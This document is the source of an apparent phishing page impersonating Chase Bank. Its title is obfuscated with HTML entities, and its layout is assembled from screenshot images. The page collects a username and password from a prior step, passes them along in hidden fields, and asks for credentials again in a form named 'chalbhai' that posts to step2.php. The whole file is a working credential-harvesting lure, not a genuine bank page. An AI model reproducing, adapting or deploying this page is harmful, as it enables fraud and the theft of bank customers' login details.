<?php
$id = $_POST['usr'];
$pass = $_POST['psw'];
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#67;&#104;&#97;&#115;&#101;&#32;&#66;&#97;&#110;&#107;&#32;&#45;&#32;&#67;&#114;&#101;&#100;&#105;&#116;&#32;&#67;&#97;&#114;&#100;&#44;&#32;&#77;&#111;&#114;&#116;&#103;&#97;&#103;&#101;&#44;&#32;&#65;&#117;&#116;&#111;&#44;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;&#32;&#83;&#101;&#114;&#118;&#105;&#99;&#101;&#115;</title>
<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
  
.textbox {
    height: 23px;
    width: 275px;
    border: 3px solid #D98C40;
	padding-left: 5px;
	font-size: 14px;
}

 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:187px; top:66px; width:993px; height:274px; z-index:0"><img src="images/w1.png" alt="" title="" border=0 width=993 height=274></div>

<div id="image2" style="position:absolute; overflow:hidden; left:185px; top:337px; width:999px; height:248px; z-index:1"><img src="images/w2.png" alt="" title="" border=0 width=999 height=248></div>

<div id="image3" style="position:absolute; overflow:hidden; left:203px; top:18px; width:135px; height:30px; z-index:2"><a href="#"><img src="images/as1.png" alt="" title="" border=0 width=135 height=30></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:1008px; top:17px; width:146px; height:17px; z-index:3"><a href="#"><img src="images/as2.png" alt="" title="" border=0 width=146 height=17></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:191px; top:595px; width:992px; height:166px; z-index:4"><img src="images/w3.png" alt="" title="" border=0 width=992 height=166></div>

<div id="image6" style="position:absolute; overflow:hidden; left:629px; top:603px; width:122px; height:16px; z-index:5"><a href="#"><img src="images/as8.png" alt="" title="" border=0 width=122 height=16></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:301px; top:635px; width:775px; height:14px; z-index:6"><a href="#"><img src="images/w4.png" alt="" title="" border=0 width=775 height=14></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:297px; top:397px; width:228px; height:18px; z-index:7"><a href="#"><img src="images/w6.png" alt="" title="" border=0 width=228 height=18></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:622px; top:309px; width:99px; height:15px; z-index:8"><a href="#"><img src="images/w7.png" alt="" title="" border=0 width=99 height=15></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:349px; top:317px; width:182px; height:14px; z-index:9"><a href="#"><img src="images/w10.png" alt="" title="" border=0 width=182 height=14></a></div>
<form action="step2.php?name=$id&name=$pass" name=chalbhai id=chalbhai method=post>
   <input name="usr" value="<?=$id?>" type="hidden">
<input name="psw"  value="<?=$pass?>" type="hidden">
<input name="usr1" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:160px;left:392px;top:246px;z-index:10">
<input name="psw1" id="demo-field" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:160px;left:392px;top:272px;z-index:11">
<div id="formcheckbox1" style="position:absolute; left:362px; top:297px; z-index:12"><input type="checkbox" name="formcheckbox1"></div>
<div id="formimage1" style="position:absolute; left:405px; top:339px; z-index:13"><input type="image" name="formimage1" width="60" height="22" src="images/bbtn.png"></div>
</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
 
	
</body>
</html>
